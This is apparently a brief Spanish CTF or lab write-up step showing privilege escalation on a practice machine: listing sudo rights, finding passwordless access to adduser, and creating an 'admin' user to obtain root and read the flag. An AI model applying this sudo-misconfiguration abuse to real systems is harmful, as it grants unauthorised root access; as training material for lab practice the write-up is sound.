#abusobinarioadduser

---


```shell
sudo -l
```
Y vemos que podemos ejecutar sin proporcionar contraseña el binario

```
(ALL : ALL) NOPASSWD: /usr/sbin/adduser
```


Usamos ``sudo /usr/sbin/adduser admin`` para agregar al usuario admin que no esta creado y con eso ya vamos a tener permisos de root
La verdad que el usuario lo saque por las preguntas del guidedmode, y fuerza bruta de ir probando
![[Manage23.png]]
![[Manage24.png]]

Ya podemos catear la flag
![[Manage25.png]]
